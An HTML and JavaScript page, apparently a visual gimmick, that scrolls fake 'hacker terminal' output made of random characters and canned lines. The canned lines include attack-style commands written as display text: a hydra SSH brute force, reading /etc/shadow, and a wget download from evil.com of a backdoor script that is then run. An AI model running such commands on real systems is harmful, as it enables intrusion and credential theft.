<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>hacker terminal — ultra fast + редкая анимация</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            min-height: 100vh;
            background: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            font-size: 1.1rem;
            line-height: 1.3;
            word-break: break-word;
            white-space: pre-wrap;
            overflow-x: hidden;
        }
        #output {
            display: block;
            width: 100%;
            padding: 0.8rem;
        }
        .line {
            display: block;
            color: #0f0;
            font-family: inherit;
            margin: 0;
            padding: 0;
            opacity: 0.95;
            text-shadow: 0 0 3px #0f0;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div id="output"></div>

    <script>
        (function() {
            const output = document.getElementById('output');

            // ----- генератор контента (такой же, как в предыдущих версиях) -----
            function randomGarbage() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{};:,.<>?/\\|`~';
                const len = Math.floor(Math.random() * 55) + 15;
                let out = '';
                for (let i = 0; i < len; i++) {
                    out += chars[Math.floor(Math.random() * chars.length)];
                }
                return out;
            }

            const hackLines = [
                "> sudo nmap -sS -O 192.168.1.0/24",
                "Starting Nmap 7.94 ( https://nmap.org )",
                "Nmap scan report for 192.168.1.1",
                "Host is up (0.0032s latency).",
                "PORT     STATE    SERVICE",
                "22/tcp   open     ssh",
                "80/tcp   open     http",
                "443/tcp  open     https",
                "3306/tcp open     mysql",
                "MAC: 00:1A:2B:3C:4D:5E (Cisco)",
                "Nmap done: 256 IP addresses (3 hosts up)",
                "> ssh root@192.168.1.105",
                "The authenticity of host '192.168.1.105' can't be established.",
                "ECDSA key fingerprint is SHA256:q3N3g7Fh9Jk2s5d8w1e4r6t9y0u7i3o2p1",
                "Are you sure you want to continue connecting (yes/no)? yes",
                "Warning: Permanently added '192.168.1.105' (ECDSA) to the list of known hosts.",
                "root@192.168.1.105's password:",
                "Permission denied (publickey,password).",
                "> telnet 10.0.0.45 23",
                "Trying 10.0.0.45...",
                "Connected to 10.0.0.45.",
                "Escape character is '^]'.",
                "login: admin",
                "Password:",
                "Last failed login: Wed Mar 19 16:20:42 UTC 2025 from 10.0.0.23",
                "$ ls -la",
                "total 168",
                "drwxr-xr-x  7 root root  4096 Mar 19 15:33 .",
                "drwxr-xr-x 25 root root  4096 Mar 19 15:33 ..",
                "-rw-------  1 root root  2048 Mar 19 15:34 .bash_history",
                "-rw-r--r--  1 root root  3128 Oct 10  2024 .bashrc",
                "-rw-r--r--  1 root root   167 Oct 10  2024 .profile",
                "drwx------  2 root root  4096 Mar 19 15:33 .ssh",
                "-rwxr-xr-x  1 root root 74320 Mar 19 15:34 exploit",
                "> ./exploit --target 10.0.0.45 --port 4444",
                "[*] Connecting to 10.0.0.45:4444",
                "[+] Connection established",
                "[*] Sending payload (876 bytes)",
                "[+] Shell obtained on port 31337",
                "# whoami",
                "root",
                "# cat /etc/shadow | grep root",
                "root:$6$rounds=656000$X7dL3fG9pQ2aR1tZ$Zv...:19437:0:99999:7:::",
                "# ifconfig",
                "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500",
                "        inet 10.0.0.45  netmask 255.255.255.0  broadcast 10.0.0.255",
                "        inet6 fe80::21a:2bff:fe3c:4d5e  prefixlen 64",
                "        ether 00:1a:2b:3c:4d:5e  txqueuelen 1000",
                "# ping -c 4 8.8.8.8",
                "PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.",
                "64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=11.3 ms",
                "64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=10.8 ms",
                "64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=12.1 ms",
                "64 bytes from 8.8.8.8: icmp_seq=4 ttl=117 time=10.9 ms",
                "--- 8.8.8.8 ping statistics ---",
                "4 packets transmitted, 4 received, 0% packet loss, time 3004ms",
                "# traceroute google.com",
                "traceroute to google.com (142.250.185.78), 30 hops max, 60 byte packets",
                " 1  10.0.0.1 (10.0.0.1)  1.231 ms  1.119 ms  1.087 ms",
                " 2  172.16.1.254 (172.16.1.254)  5.432 ms  5.211 ms  5.099 ms",
                " 3  192.168.50.1 (192.168.50.1)  12.345 ms  12.101 ms  12.078 ms",
                " 4  81.200.64.1 (81.200.64.1)  18.765 ms  18.543 ms  18.321 ms",
                " 5  142.250.185.78 (142.250.185.78)  21.234 ms  21.001 ms  20.899 ms",
                "# exit",
                "Connection to 10.0.0.45 closed.",
                "> hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105",
                "Hydra v9.4 (c) 2023 by van Hauser / THC",
                "[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)",
                "[22][ssh] host: 192.168.1.105   login: admin   password: passw0rd",
                "[STATUS] attack finished for 192.168.1.105 (waiting for childs to finish)",
                "> wget http://evil.com/backdoor.sh",
                "--2025-03-19 16:45:02--  http://evil.com/backdoor.sh",
                "Resolving evil.com (evil.com)... 5.5.5.5",
                "Connecting to evil.com (evil.com)|5.5.5.5|:80... connected.",
                "HTTP request sent, awaiting response... 200 OK",
                "Length: 1245 (1.2K) [text/x-sh]",
                "Saving to: ‘backdoor.sh’",
                "backdoor.sh         100%[===================>]   1.21K  --.-KB/s    in 0s",
                "> chmod +x backdoor.sh && ./backdoor.sh",
                "[*] Backdoor installed. Connecting to C2...",
                "[+] Beacon started."
            ];

            function nextLine() {
                if (Math.random() < 0.3) {
                    return randomGarbage();
                } else {
                    return hackLines[Math.floor(Math.random() * hackLines.length)];
                }
            }

            // ----- параметры потока -----
            const MAX_LINES = 1000;          // увеличили, чтобы при бешеной скорости строки жили подольше
            let linesCount = 0;

            function removeOldestIfNeeded() {
                while (linesCount > MAX_LINES) {
                    output.removeChild(output.firstChild);
                    linesCount--;
                }
            }

            function scrollToBottom() {
                window.scrollTo(0, document.body.scrollHeight);
            }

            // ----- анимация печати по буквам (с защитой от удаления) -----
            function animateLine(text, container) {
                let index = 0;
                const total = text.length;
                const stepDelay = Math.floor(Math.random() * 30) + 20; // 20–50 мс на символ

                function addChar() {
                    // если элемент удалён из DOM – прекращаем анимацию
                    if (!container.parentNode) return;

                    if (index < total) {
                        container.textContent += text[index];
                        index++;
                        scrollToBottom();               // прокручиваем при каждом символе
                        setTimeout(addChar, stepDelay);
                    }
                    // else – анимация завершена, ничего не делаем
                }
                addChar();
            }

            // ----- добавление одной строки (обычной или анимированной) -----
            function processNextLine() {
                const useAnimation = Math.random() < 0.005;        // 0.5% – примерно 1 раз в 200 строк (интервал 100–300)
                const lineText = nextLine();

                const lineDiv = document.createElement('div');
                lineDiv.className = 'line';
                output.appendChild(lineDiv);
                linesCount++;

                removeOldestIfNeeded();   // если превышен лимит – удалим самые старые

                if (useAnimation) {
                    lineDiv.textContent = '';          // начинаем с пустой строки
                    animateLine(lineText, lineDiv);
                } else {
                    lineDiv.textContent = lineText;
                    scrollToBottom();                   // обычная строка – прокрутка один раз
                }

                // Сразу планируем следующую строку (не ждём окончания анимации)
                generateNextLine();
            }

            // ----- планировщик: интервал 5–15 мс -----
            function generateNextLine() {
                const delay = Math.floor(Math.random() * 11) + 5;   // 5–15 мс
                setTimeout(processNextLine, delay);
            }

            // ----- быстрое предзаполнение (20 строк, чтобы не было пусто) -----
            for (let i = 0; i < 20; i++) {
                const lineDiv = document.createElement('div');
                lineDiv.className = 'line';
                lineDiv.textContent = nextLine();
                output.appendChild(lineDiv);
                linesCount++;
            }
            scrollToBottom();

            // Запускаем бесконечный цикл добавления
            generateNextLine();
        })();
    </script>
</body>
</html>
